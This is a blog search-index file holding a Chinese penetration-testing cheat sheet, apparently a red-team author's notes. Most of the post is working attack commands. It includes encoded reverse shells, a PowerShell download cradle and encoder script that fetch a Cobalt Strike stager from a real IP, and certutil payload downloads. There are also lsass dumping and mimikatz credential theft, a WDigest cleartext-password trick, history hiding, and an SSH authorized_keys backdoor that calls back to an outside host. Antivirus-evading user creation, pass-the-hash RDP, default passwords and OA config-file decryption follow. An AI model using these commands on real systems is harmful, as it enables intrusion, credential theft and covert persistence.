<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>tips</title>
    <link href="/2024/04/07/tips/"/>
    <url>/2024/04/07/tips/</url>
    
    <content type="html"><![CDATA[<h1 id="不成体系的渗透测试tips"><a href="#不成体系的渗透测试tips" class="headerlink" title="不成体系的渗透测试tips"></a>不成体系的渗透测试tips</h1><h2 id="关于RCE"><a href="#关于RCE" class="headerlink" title="关于RCE"></a>关于RCE</h2><h3 id="调用java-lang-Runtime-exec-的姿势"><a href="#调用java-lang-Runtime-exec-的姿势" class="headerlink" title="调用java.lang.Runtime.exec()的姿势"></a>调用java.lang.Runtime.exec()的姿势</h3><blockquote><p>当命令中包含重定向 ‘ &lt; ‘ ‘ &gt; ‘ 和管道符’ | ‘ 时，执行命令会失效，因为重定向和管道字符的使用方式在启动过程的上下文中没有意义。</p></blockquote><ol><li><p>借助 <a href="https://www.lintstar.top/shell-java/">Base64 编码转换</a>，通过调用 Bash 或 PowerShell 来制作管道并重新定向，还可以确保参数内没有空格。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java.lang.Runtime.exec(&quot;echo 123&gt;123.txt&quot;)  //不可行</span><br>java.lang.Runtime.exec(<span class="hljs-string">&quot;bash -c &#123;echo,ZWNobyAxMjM+MTIzLnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)<br>java.lang.Runtime.exec(<span class="hljs-string">&quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ZQBjAGgAbwAgADEAMgAzAD4AMQAyADMALgB0AHgAdAA=&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>使用exec(String [] cmdArray) 或者exec(String []cmdarray,String []envp,File dir)来执</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java.lang.Runtime.exec(&quot;echo 123&gt;123.txt&quot;)  //不可行</span><br>java.lang.Runtime.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;echo 123&gt;123.txt&quot;</span>&#125;)<span class="hljs-comment">//linux</span><br>java.lang.Runtime.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,<span class="hljs-string">&quot;echo 123&gt;123.txt&quot;</span>&#125;)<span class="hljs-comment">//Windows</span><br></code></pre></td></tr></table></figure></li></ol><p><a href="https://www.lintstar.top/shell-java/">在线Shell 编码 (Java)</a></p><h2 id="关于反弹shell-x2F-上线cs"><a href="#关于反弹shell-x2F-上线cs" class="headerlink" title="关于反弹shell&#x2F;上线cs"></a>关于反弹shell&#x2F;上线cs</h2><ul><li><p>bash反弹(容错率高)</p><ul><li>base64版：<code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></li></ul></li><li><p>powershell上线cs</p><ul><li><p>powershell自带base64版(与常规base64编码不同)：<code>powershell.exe -eNco cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgACAALQBjACAAKABJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEALgAxADEANwAuADEANQA1AC4AMgAxADcAOgA4ADAALwAyADEAOQAxADgAJwApACkAKQA=</code></p></li><li><p>powershell编码脚本base64.ps1</p><ul><li><p>脚本使用方法：<code>.\base64.ps1 http://1.117.155.217:80/21918</code>,参数为远程cs上线脚本地址</p></li><li><p>脚本代码如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>]<br><span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;powershell.exe -nop -w hidden -c (IEX ((new-object net.webclient).downloadstring(&#x27;<span class="hljs-variable">$ip</span>&#x27;)))&quot;</span><br><span class="hljs-variable">$bytes</span> = [<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$command</span>)<br><span class="hljs-variable">$encodedCommand</span> = [<span class="hljs-type">Convert</span>]::ToBase64String(<span class="hljs-variable">$bytes</span>)<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;powershell.exe -eNco &quot;</span>+<span class="hljs-variable">$encodedCommand</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$payload</span><br></code></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="关于内网渗透的certutil程序"><a href="#关于内网渗透的certutil程序" class="headerlink" title="关于内网渗透的certutil程序"></a>关于内网渗透的certutil程序</h2><ol><li><p>通常用法-远程下载</p><p><code>certutil -urlcache -split -f http://vps/shell.exe s.exe </code></p></li></ol><blockquote><p>windows自带exe</p><p>-f                – 强制覆盖</p><p>-split            – 分离嵌入的 ASN.1 元素，并保存到文件</p><p>-URLCache         – 显示或删除 URL 缓存项目</p></blockquote><ol start="2"><li>base64编码</li></ol><ul><li><p>先本地转换成base64编码文件</p><p><code>certutil -encode cs.exe cs.txt</code></p><ul><li><p>文件太大可考虑分块传输</p><p>将文件拆分为 cs1.txt&#x2F;cs2.txt&#x2F;cs3.txt…  可以使用crty+g定位文本位置</p></li></ul></li><li><p>目标机远程下载经过base64编码文件</p><p><code>certutil -urlcache -split -f http://192.168.0.100/cs.txt</code></p><ul><li><p>分块传输完成后再整合解码</p><p><code>copy cs*.txt cs.txt</code></p></li></ul></li><li><p>目标机解码并执行exe</p></li></ul><p>​<code>certutil -decode cs.txt cs.exe</code></p><h2 id="关于win密码获取（bypass）"><a href="#关于win密码获取（bypass）" class="headerlink" title="关于win密码获取（bypass）"></a>关于win密码获取（bypass）</h2><blockquote><p>Procdump是微软自家的外部工具，其主要目的是监视应用程序中的CPU尖峰并在尖峰期间生成崩溃转储。</p></blockquote><ol><li>使用<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>工具转储lsass进程</li></ol><p>​<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></p><ol start="2"><li>mimikatz查看密码</li></ol><p>​<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p><h2 id="关于隐藏bash历史命令"><a href="#关于隐藏bash历史命令" class="headerlink" title="关于隐藏bash历史命令"></a>关于隐藏bash历史命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">空格隐藏,命令行前输入空格,需要环境变量 HISTCONTROL 设置为 “ignorespace”</span><br>export HISTCONTROL=ignorespace<br><span class="hljs-meta prompt_">#</span><span class="language-bash">只针对当前shell关闭历史记录，因为用了空格所以不会记录当前命令</span><br>[space]set +o history<br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除空格隐藏命令记录</span><br>history -d [export HISTCONTROL=ignorespace 该条命令的行数]<br></code></pre></td></tr></table></figure><h2 id="关于SQL注入"><a href="#关于SQL注入" class="headerlink" title="关于SQL注入"></a>关于SQL注入</h2><ol><li><p>MSSQL注入</p><blockquote><p>用于快速查询用户表（某次打点获取sql注入但是表太多了，sqlmap跑太慢了）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mssql">/*得到 dbname数据库中所有包含user字段的表名和表id*/<br>select name,id from dbname.sysobjects where name like &#x27;%user%&#x27;  <br>/*得到 dbname数据库某个user表中所有列字段*/<br>select name,id from dbname.syscolumns where id = xxx <br>/*得到 具体数据*/<br>select username,password from dbname..sysuser <br><br></code></pre></td></tr></table></figure></li></ol><h2 id="正则排除字符串"><a href="#正则排除字符串" class="headerlink" title="正则排除字符串"></a>正则排除字符串</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">正则排除字符串：^(?!.<span class="hljs-strong">*vue).*</span>$<br></code></pre></td></tr></table></figure><h2 id="关于linux后门"><a href="#关于linux后门" class="headerlink" title="关于linux后门"></a>关于linux后门</h2><ol><li><code>authorized_keys</code> command参数后门,第一次登录执行命令后进行复原（不然无法进行ssh私钥登录）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">command=&quot;bash -i &gt;&amp; /dev/tcp/k3rwin.top/40192 0&gt;&amp;1;sed &#x27;s#.*ssh-rsa*#ssh-rsa#g&#x27; /root/.ssh/authorized_keys&quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDgqbBANlcOkviE3lkybDU+jK69GgdiUUYmsiJqmVndbnxmtrmw3zUYzDPliIjAHrAz/NECyyGUL/3A5E6Gmzp5nftXS0TgS1BYxyCx2xD7rYpwyGlgrj6as+mnalAIWL2/Ece8+IMdJpDuqnuip6rgjXaI+MYSr7VlwO44FKMLadgE5Os3bLPZj3WP6+F5dV056Vyzwekb3KrChQ5FAsC4JYJ1e4nP3NFZaBB/GZsKseKYZAIIMwMtJzRsdNZo+FbZRUH4eFIZqYDyo/0Ms76BRQAXiQE2+IKJcuhK5pyXNdK/FlBA7OtkEYZiuEc5Gq8key7qquLvFk/X8TNWERd4wSY+ec4VatMUYWyI3bq4V/g05rxf8P7iZ6NXYX9GelgO5+JroxNu+wil1s4p2lmLHCncG/FnJvwzw5qNiLiXyXfIK91j+D03aN9M1Y/UuQikf6p3OQ54gW5Oxnkfqc9oLgW0FMsUohQMtwfwJiJ9eUupcme4adTlQMWCq1Lhgc= k3rwin@MacBook-Pro.local<br></code></pre></td></tr></table></figure><h2 id="各类中间件webshell目录"><a href="#各类中间件webshell目录" class="headerlink" title="各类中间件webshell目录"></a>各类中间件webshell目录</h2><h3 id="1-weblogic"><a href="#1-weblogic" class="headerlink" title="1.weblogic"></a>1.weblogic</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">console后台 <span class="hljs-regexp">/u01/</span>oracle<span class="hljs-regexp">/wlserver/</span>server<span class="hljs-regexp">/lib/</span>consoleapp<span class="hljs-regexp">/webapp/im</span>ages/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">8.146</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/console/im</span>ages/xx.jsp<br></code></pre></td></tr></table></figure><h2 id="ruoyi系统漏洞挖掘思路"><a href="#ruoyi系统漏洞挖掘思路" class="headerlink" title="ruoyi系统漏洞挖掘思路"></a>ruoyi系统漏洞挖掘思路</h2><h3 id="1-系统弱口令"><a href="#1-系统弱口令" class="headerlink" title="1.系统弱口令"></a>1.系统弱口令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin/admin123<br>ry/admin123<br></code></pre></td></tr></table></figure><h3 id="2-Druid-未授权-or-弱口令"><a href="#2-Druid-未授权-or-弱口令" class="headerlink" title="2.Druid 未授权 or 弱口令"></a>2.Druid 未授权 or 弱口令</h3><p>自定义接口地址可以通过js查看（findsomething）</p><p><img src="/tips.assets/image-20240329102738409.png" alt="image-20240329102738409"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/prod-api/</span>druid/login.html<br><span class="hljs-regexp">/prod-api/</span>druid/index.html<br><span class="hljs-regexp">/dev-api/</span>druid/login.html<br><span class="hljs-regexp">/dev-api/</span>druid/index.html<br><span class="hljs-regexp">/api/</span>druid/login.html<br><span class="hljs-regexp">/api/</span>druid/index.html<br><span class="hljs-regexp">/admin/</span>druid/login.html<br><span class="hljs-regexp">/admin/</span>druid/index.html<br><span class="hljs-regexp">/admin-api/</span>druid/login.html<br><span class="hljs-regexp">/admin-api/</span>druid/index.html<br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">ruoyi/<span class="hljs-number">123456</span> <br><span class="hljs-literal">admin</span>/<span class="hljs-number">123456</span><br><span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span><br></code></pre></td></tr></table></figure><p>进一步利用可结合Seeion和URI模块</p><h3 id="3-swagger未授权访问漏洞"><a href="#3-swagger未授权访问漏洞" class="headerlink" title="3.swagger未授权访问漏洞"></a>3.swagger未授权访问漏洞</h3><p>接口地址后拼接路径</p><p>经典路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/prod-api/</span>swagger-ui/index.html<br><span class="hljs-regexp">/prod-api/</span>v2/api-docs<br><span class="hljs-regexp">/prod-api/</span>v3/api-docs<br></code></pre></td></tr></table></figure><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="一-数据库配置文件查找"><a href="#一-数据库配置文件查找" class="headerlink" title="一.数据库配置文件查找"></a>一.数据库配置文件查找</h2><h3 id="1-致远OA"><a href="#1-致远OA" class="headerlink" title="1.致远OA"></a>1.致远OA</h3><p>密码需要配合解密工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">路径:Seeyon/A8/base/conf/datasourceCtp.properties<br><br><br>❯ java -jar PassDecode.jar seeyon /xx/sxxxTJCTcg==<br>xx3456<br><br><br><br><br>人员档案表：org_member<br><br>人员档案密码表：org_principal 用户名字段:LOGIN_NAME 密码字段:CREDENTIAL_VALUE<br><br><br>sha解密:<br>❯ java -jar seeyonDecrypt.jar<br>请输入用户名字典绝对路径(格式：user$密文)：/Users/k3rwin/Desktop/1.txt<br>请输入密码字典绝对路径：/Users/k3rwin/Documents/tools/0password/pass200_2021.txt<br><br><br></code></pre></td></tr></table></figure><h3 id="2-泛微OA"><a href="#2-泛微OA" class="headerlink" title="2.泛微OA"></a>2.泛微OA</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">路径:WEAVER\ecology\WEB-INF\prop\weaver.properties<br><br>  库/表：ECOLOGY/HrmResource  HrmResourceManager<br></code></pre></td></tr></table></figure><h3 id="3-泛微云桥e-Bridge"><a href="#3-泛微云桥e-Bridge" class="headerlink" title="3.泛微云桥e-Bridge"></a>3.泛微云桥e-Bridge</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">配置文件路径：tomcat\webapps\ROOT\WEB-INF\classes\init.properties<br>库/表：ewechat/wx_base_user<br></code></pre></td></tr></table></figure><h3 id="4-蓝凌OA"><a href="#4-蓝凌OA" class="headerlink" title="4.蓝凌OA"></a>4.蓝凌OA</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">配置文件路径<span class="hljs-symbol">:/WEB-INF/KmssConfig/admin</span>.properties<br>默认<span class="hljs-title class_">DES</span>加密，秘钥  kmssAdminKey <span class="hljs-title class_">ECB</span> <span class="hljs-title class_">Zero</span><br>数据库用户表：ekp.sys_org_person<br></code></pre></td></tr></table></figure><p><a href="https://the-x.cn/cryptography/Des.aspx">des解密地址</a></p><h3 id="5-万户OA"><a href="#5-万户OA" class="headerlink" title="5. 万户OA"></a>5. 万户OA</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">数据库配置文件:<span class="hljs-regexp">/deploy/</span>defaultroot.war<span class="hljs-regexp">/WEB-INF/</span>config/whconfig.xml <br></code></pre></td></tr></table></figure><h3 id="6-通达OA"><a href="#6-通达OA" class="headerlink" title="6.通达OA"></a>6.通达OA</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">数据库配置文件<span class="hljs-symbol">:/webroot/inc/oa_config</span>.php;<span class="hljs-regexp">/MYOA/mysql</span>5/my.ini <br></code></pre></td></tr></table></figure><h3 id="7-HIKVISON配置"><a href="#7-HIKVISON配置" class="headerlink" title="7.HIKVISON配置"></a>7.HIKVISON配置</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmd">配置文件:<br>tomcat/apache-tomcat/webapps/center/WEB-INF/classes/conf/config.properties<br><br>运行管理中心数据库配置文件路径：/opt/hikvision/web/opsMgrCenter/conf/config.properties<br><br>java -jar Hikvision.jar EQAQAFZ3Y6HjwZxJLI4q2yt8901gBREknRtK8is0z4RPTHmzwODVhGSolQWTA8fLwnt0aQ==<br>=======================基 本 信 息=======================<br>海康威视综合安防平台: 数据库解密/用户名密码替换<br>下载地址: https://github.com/wafinfo/Hikvision<br>只适合Windows平台使用，暂不支持linux+MacOs<br>=======================使 用 文 档=======================<br><br>lPT2x2Bg<br><br>irds_irdsdb.tb_user表，替换密码和salt值，明文密码为hik12345+<br>user_pwd：<span class="hljs-number">57</span>b303e3875c0e6834e388912a36215e044872f45b0d5bc01ef9eb47267a8292<br>Salt：<span class="hljs-number">8</span>e8c4210822e51efc34904279f8d716ce9a6c3f76f76d58690898eb08533ea76<br></code></pre></td></tr></table></figure><h3 id="8-用友NC"><a href="#8-用友NC" class="headerlink" title="8.用友NC"></a>8.用友NC</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">主要的数据表<br>gl<span class="hljs-emphasis">_czy 用户库</span><br><span class="hljs-emphasis">gl_knxx 科目信息</span><br><span class="hljs-emphasis">gl_pznr 凭证内容</span><br><span class="hljs-emphasis">gl_pzml 凭证目录</span><br><span class="hljs-emphasis">gl_</span>yeb 余额表<br></code></pre></td></tr></table></figure><h2 id="二-RDP相关"><a href="#二-RDP相关" class="headerlink" title="二.RDP相关"></a>二.RDP相关</h2><ol><li><p>rdp 端口查看</p><ul><li><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></li></ul></li><li><p>开启rdp(老版本和新版windows版本不一样)</p><ul><li><p>windows server 2003</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cmd">开启：<br>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br>关闭：<br>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">11111111</span> /f<br>开启：<br>wmic RDTOGGLE WHERE ServerName=&#x27;<span class="hljs-variable">%COMPUTERNAME%</span>&#x27; <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span>`<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br>REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">0</span> /f<br></code></pre></td></tr></table></figure></li><li><p>windows server 2008</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">开启：<br>REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d <span class="hljs-number">0</span>x00000d3d /f<br></code></pre></td></tr></table></figure></li></ul></li><li><p>有的时候使用mstsc命令远程登录时无法正常进行远程登录，这时候可以使用强制远程登录命令，具体如下：<br><code>mstsc /admin /v:ip:port</code></p></li><li><p>高版本rdp查看明文密码</p><ul><li><ol><li>修改注册表设置允许存储明文密码</li></ol><p><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p></li><li><ol start="2"><li>让系统强制锁屏，等待管理员重新输入账号密码后，即可抓取到明文密码。</li></ol><p><code>rundll32.exe user32.dll,LockWorkStation</code></p></li><li><ol start="3"><li>明文读取密码</li></ol><p><code>mimikatz.exe log privilege::Debug sekurlsa::logonpasswords exit</code></p><p><code>type mimikatz.log | find /i &quot;password&quot;</code></p></li></ul></li><li><p>绕过火绒添加用户（管理员权限）</p><ul><li><p><code>copy c:\windows\system32\net1.exe  user.txt user.txt user user User@123 /add</code></p></li><li><p>使用api绕过工具(360+火绒)</p><p><code>UserAdd.exe -u user -p User@123</code></p></li></ul></li><li><p>pth登录rdp</p><blockquote><h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><p>Windows 8.1和Windows Server 2012 R2默认支持该功能</p><p>Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351 </p></blockquote><ul><li><p>前提：读取密码ntlm hash</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz(commandline) # privilege::Debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br><br>mimikatz # sekurlsa::logonpasswords<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">121408</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0001</span>da40)<br>Session           : Interactive from <span class="hljs-number">1</span><br>User Name         : k<br>Domain            : WIN-GLK80GASVHN<br>Logon Server      : WIN-GLK80GASVHN<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2023</span>/<span class="hljs-number">7</span>/<span class="hljs-number">18</span> <span class="hljs-number">22</span>:<span class="hljs-number">05</span>:<span class="hljs-number">39</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1056568604</span>-<span class="hljs-number">1678046401</span>-<span class="hljs-number">925633874</span>-<span class="hljs-number">1000</span><br>msv :<br> [<span class="hljs-number">00000003</span>] Primary<br> * Username : k<br> * Domain   : WIN-GLK80GASVHN<br> * NTLM     : <span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c<br> * SHA1     : <span class="hljs-number">2668</span>c39830b17a736b55d60420780d3ddd34c570<br> [<span class="hljs-number">00010000</span>] CredentialKeys<br> * NTLM     : <span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c<br> * SHA1     : <span class="hljs-number">2668</span>c39830b17a736b55d60420780d3ddd34c570<br></code></pre></td></tr></table></figure></li><li><p>开启Restricted Admin mode(客户端和服务端都需要开启)</p><p><code>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</code></p></li><li><p>本地使用mimikatz启动mstsc远程连接，不用输入密码即可登录</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz # privilege::debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br>mimikatz # sekurlsa::pth /user:k /domain:WIN-GLK80GASVHN /ntlm:<span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c &quot;/run:mstsc.exe /restrictedadmin&quot;<br>user    : k<br>domain  : WIN-GLK80GASVHN<br>program : mstsc.exe /restrictedadmin<br>impers. : no<br>NTLM    : <span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c<br>  |  PID  <span class="hljs-number">6516</span><br>  |  TID  <span class="hljs-number">7092</span><br>  |  LSA Process is now R/W<br>  |  LUID <span class="hljs-number">0</span> ; <span class="hljs-number">11435766</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">00</span>ae7ef6)<br>  \_ msv1_0   - data <span class="hljs-built_in">copy</span> @ <span class="hljs-number">0000023</span>F09D93250 : OK !<br>  \_ kerberos - data <span class="hljs-built_in">copy</span> @ <span class="hljs-number">0000023</span>F09C64388<br>   \_ des_cbc_md4       -&gt; null<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ *Password <span class="hljs-built_in">replace</span> @ <span class="hljs-number">0000023</span>F09D8A4A8 (<span class="hljs-number">32</span>) -&gt; null<br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="三-远控软件的使用"><a href="#三-远控软件的使用" class="headerlink" title="三.远控软件的使用"></a>三.远控软件的使用</h2><h3 id="1-todesk配置文件获取"><a href="#1-todesk配置文件获取" class="headerlink" title="1.todesk配置文件获取"></a>1.todesk配置文件获取</h3><ul><li><p>文件安装目录</p><ul><li>高版本系统<code>C:\Program Files\ToDesk</code></li><li>低版本系统<code>C:\Program Files (x86)\ToDesk</code></li></ul></li><li><p>配置文件<code>config.ini</code>,覆盖本地todesk配置文件即可获取密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">clientId</span>=识别码<br><span class="hljs-attr">tempAuthPassEx</span>=临时密码<br><span class="hljs-attr">authPassEx</span>=安全密码<br></code></pre></td></tr></table></figure></li></ul><h2 id="四-操作系统信息查找"><a href="#四-操作系统信息查找" class="headerlink" title="四.操作系统信息查找"></a>四.操作系统信息查找</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 